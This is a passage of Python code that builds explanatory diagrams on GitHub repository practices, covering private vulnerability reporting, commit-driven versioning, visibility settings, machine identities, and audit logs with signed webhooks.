                   "A researcher's report goes privately through the Security tab into a draft advisory seen only by "
                   "maintainers, who fix it in a private fork, request a CVE and publish the advisory with the release, "
                   "instead of the report appearing as a public issue.")
        y = lanes(D, y, [
            ("Enabled", [("Researcher reports", "Security tab", "data"),
                         ("Draft advisory", "Maintainers only", "focus"),
                         ("Fix in private fork", "Request a CVE"),
                         ("Publish with release", None, "good")], True),
            ("Not enabled", [("Researcher reports", "Public issue", "data"),
                             ("Indexed within the hour", None, "warn"),
                             ("Users exposed before a patch", None, "risk")], None),
        ])
        return finish(D, y, [("data", "report"), ("focus", "private channel"), ("good", "coordinated"), ("risk", "public too early")])

    def d3_7(f):
        D, y = new(f, "Conventional Commits Drive Versions",
                   "The type sets the bump; ! or a BREAKING CHANGE footer always means major.",
                   "Commit types map to version bumps: fix to a patch, feat to a minor release, and an exclamation mark or "
                   "BREAKING CHANGE footer to a major release, feeding an automatic changelog.")
        y = pairs(D, y, [
            (("fix(api): handle null response", None, "data"), ("PATCH", "2.4.1 → 2.4.2", "good"), None),
            (("feat(auth): add OAuth2 login", None, "data"), ("MINOR", "2.4.2 → 2.5.0", "good"), None),
            (("feat!: remove v1 endpoints", "Or a BREAKING CHANGE: footer", "data"), ("MAJOR", "2.5.0 → 3.0.0", "focus"), None),
            (("docs:, chore:, ci:, test:", None, "data"), ("No release on their own", "Still listed in the changelog"), None),
        ], heads=("Commit message", "Version bump"))
        return finish(D, y, [("data", "commit"), ("good", "bump"), ("focus", "breaking")])

    def d3_8(f):
        D, y = new(f, "Visibility, Archive, Topics and Properties",
                   "Visibility decides who sees it; properties decide which policies apply.",
                   "Public, internal and private visibility are compared by who can see the repository, archiving freezes "
                   "a retired repository, topics help people find repositories, and custom properties let rulesets and "
                   "security configurations target them.")
        y = table(D, y, [("Visibility", None, "start"), ("Who can see it", None, "start"), ("Use for", None, "start")], [
            [("Public", None, "warn"), ("Everyone on the internet",), ("Open source",)],
            [("Internal", None, "focus"), ("Every enterprise member", "Not outside collaborators"), ("Inner source", "GitHub Enterprise")],
            [("Private", None, "good"), ("Only people and teams granted access",), ("Restricted code",)],
        ], first_w=150)
        y = lanes(D, y + 6, [("Govern and find", [("Archive", "Whole repo read-only"),
                                                  ("Topics", "Discovery only", "data"),
                                                  ("Custom properties", "tier=critical: rulesets and configs target these", "focus")], False)])
        return finish(D, y, [("warn", "widest"), ("focus", "enterprise-wide / policy target"), ("good", "narrowest"), ("data", "findability")])

    def d3_9(f):
        D, y = new(f, "Machine Identities: Automation Acts as Itself",
                   "Pick the narrowest, shortest-lived credential that does the job.",
                   "Each automation need maps to its identity: GitHub API work across repositories to a GitHub App with "
                   "one-hour tokens, a server pulling one repository to a read-only deploy key, cloud deploys to OIDC, and "
                   "personal scripts to a short-lived fine-grained token.")
        y = pairs(D, y, [
            (("Bots and release tooling across repos", None, "data"), ("GitHub App", "Fine-grained, no seat, 1-hour installation tokens", "focus"), None),
            (("A server pulls one repository", None, "data"), ("Deploy key, read-only", "One per server; doesn't expire"), None),
            (("Deploy to AWS, Azure or GCP", None, "data"), ("OIDC", "No stored cloud key", "good"), None),
            (("A personal or one-off script", None, "data"), ("Fine-grained PAT", "Short expiry; tied to a person", "warn"), None),
        ], heads=("Need", "Identity"))
        return finish(D, y, [("data", "need"), ("focus", "default for automation"), ("good", "no stored secret"), ("warn", "person-bound")])

    def d3_10(f):
        D, y = new(f, "Audit Log and Signed Webhooks",
                   "The log says who changed what; the signature says the payload is really from GitHub.",
                   "Organization events flow into the audit log and on to a SIEM for alerting, while a webhook receiver "
                   "recomputes the HMAC signature over the raw body and rejects any payload whose signature doesn't match.")
        y = lanes(D, y, [
            ("Audit log", [("Org events", "Permissions, rulesets, secrets, bypasses", "data"),
                           ("Audit log", "Actor and timestamp", "focus"),
                           ("Stream to SIEM", "Alert on ruleset changes", "good")], True),
            ("Webhook receiver", [("Payload + X-Hub-Signature-256", None, "data"),
                                  ("Recompute HMAC-SHA256", "Raw body, constant-time compare"),
                                  ("Match: process", None, "good")], True),
            ("Forged request", [("POST claiming to be GitHub", None, "data"),
                                ("Signature mismatch", None, "risk"),
                                ("Rejected", "TLS and X-GitHub-Event don't prove the sender", "good")], None),
        ])
        return finish(D, y, [("data", "input"), ("focus", "record"), ("good", "trusted outcome"), ("risk", "forged")])

    fns = {
        "ghbp-1-1-protection-gate": d1_1, "ghbp-1-2-bypass": d1_2, "ghbp-1-3-rulesets-stack": d1_3,
        "ghbp-1-4-codeowners": d1_4, "ghbp-1-5-merge-gates": d1_5, "ghbp-1-6-required-workflow": d1_6,
        "ghbp-1-7-branching": d1_7, "ghbp-1-8-naming": d1_8, "ghbp-1-9-lifecycle": d1_9, "ghbp-1-10-risk-matrix": d1_10,
        "ghbp-2-1-token-permissions": d2_1, "ghbp-2-2-secret-scopes": d2_2, "ghbp-2-3-oidc": d2_3,
        "ghbp-2-4-pinning": d2_4, "ghbp-2-5-injection": d2_5, "ghbp-2-6-runners": d2_6, "ghbp-2-7-dependabot": d2_7,
        "ghbp-2-8-cache-scope": d2_8, "ghbp-2-9-code-scanning": d2_9, "ghbp-2-10-reuse": d2_10,
        "ghbp-2-11-environments": d2_11, "ghbp-2-12-workflow-control": d2_12,
        "ghbp-3-1-repo-files": d3_1, "ghbp-3-2-push-protection": d3_2, "ghbp-3-3-security-products": d3_3,
        "ghbp-3-4-dependency-review": d3_4, "ghbp-3-5-templates": d3_5, "ghbp-3-6-private-reporting": d3_6,
        "ghbp-3-7-commit-types": d3_7, "ghbp-3-8-visibility": d3_8, "ghbp-3-9-machine-identities": d3_9,
        "ghbp-3-10-audit-webhooks": d3_10,
    }
    return {name: ("ghbp", fn) for name, fn in fns.items()}
